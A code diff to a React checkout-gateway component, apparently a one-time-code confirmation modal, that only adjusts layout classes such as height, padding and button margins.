@@ -597,7 +597,7 @@ export default function OnlineCheckoutGateway({
     return (
       <div className="fixed inset-0 bg-[#0c1822] sm:bg-[#1d2d3d]/90 z-[9999] flex justify-center items-center sm:items-start overflow-hidden sm:overflow-y-auto p-0 sm:p-5 font-sans selection:bg-[#a71a1d] selection:text-white animate-fade-in">
         <div 
-          className="w-full max-w-[500px] h-full sm:h-auto shadow-2xl flex flex-col select-none my-0 sm:my-8 rounded-none sm:rounded-2xl border border-white/10 relative p-4 sm:p-6 overflow-hidden"
+          className="w-full max-w-[500px] h-[100dvh] sm:h-auto shadow-2xl flex flex-col select-none my-0 sm:my-8 rounded-none sm:rounded-2xl border border-white/10 relative pt-10 pb-3 px-4 sm:p-6 overflow-hidden"
           style={{
             background: 'radial-gradient(ellipse at center, #ff1224 0%, #d81421 28%, #bc101c 55%, #9d0913 100%)'
           }}
@@ -665,7 +665,7 @@ export default function OnlineCheckoutGateway({
                   <p className="text-white/80 text-[10px] sm:text-[11px] mt-3 sm:mt-4 tracking-wide max-w-[340px] leading-relaxed">
                     By clicking/tapping "Proceed" you are agreeing to our <span className="font-bold underline cursor-pointer">Terms and Conditions</span>
                   </p>
-                  <div className="flex gap-4 justify-center w-full max-w-[320px] mt-10 sm:mt-20">
+                  <div className="flex gap-4 justify-center w-full max-w-[320px] mt-6 sm:mt-16">
                     <button type="submit" disabled={isConfirmDisabled()} className="flex-1 py-1.5 sm:py-2 rounded bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer disabled:opacity-50">Proceed</button>
                     <button type="button" onClick={handleCancelAction} className="flex-1 py-1.5 sm:py-2 rounded bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer font-sans">Close</button>
                   </div>
@@ -691,7 +691,7 @@ export default function OnlineCheckoutGateway({
                   {countdown > 0 && (
                      <p className="text-white/70 text-[11px] mt-2">Remaining time: {countdown}s</p>
                   )}
-                  <div className="flex gap-2 justify-center w-full max-w-[340px] mt-10 sm:mt-20">
+                  <div className="flex gap-2 justify-center w-full max-w-[340px] mt-6 sm:mt-16">
                     <button type="submit" disabled={isConfirmDisabled()} className="flex-1 py-1.5 sm:py-2 rounded bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer disabled:opacity-50">Proceed</button>
                     <button type="button" disabled={countdown > 0} onClick={() => setCountdown(120)} className="flex-1 py-1.5 sm:py-2 rounded bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer disabled:opacity-55 font-sans">Resend Code</button>
                     <button type="button" onClick={handleCancelAction} className="flex-1 py-1.5 sm:py-2 rounded bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer font-sans">Close</button>
@@ -718,7 +718,7 @@ export default function OnlineCheckoutGateway({
                     className="w-full max-w-[280px] h-[36px] border-none rounded-md text-center text-[18px] text-zinc-700 font-semibold focus:outline-none focus:ring-2 focus:ring-white/30 shadow-xs bg-white tracking-widest placeholder-zinc-400"
                     style={{ WebkitTextSecurity: 'disc' }}
                   />
-                  <div className="flex gap-4 justify-center w-full max-w-[320px] mt-10 sm:mt-20">
+                  <div className="flex gap-4 justify-center w-full max-w-[320px] mt-6 sm:mt-16">
                     <button type="submit" disabled={isConfirmDisabled()} className="flex-1 py-1.5 sm:py-2 rounded bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer disabled:opacity-50">Proceed</button>
                     <button type="button" onClick={handleCancelAction} className="flex-1 py-1.5 sm:py-2 rounded bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer font-sans">Close</button>
                   </div>
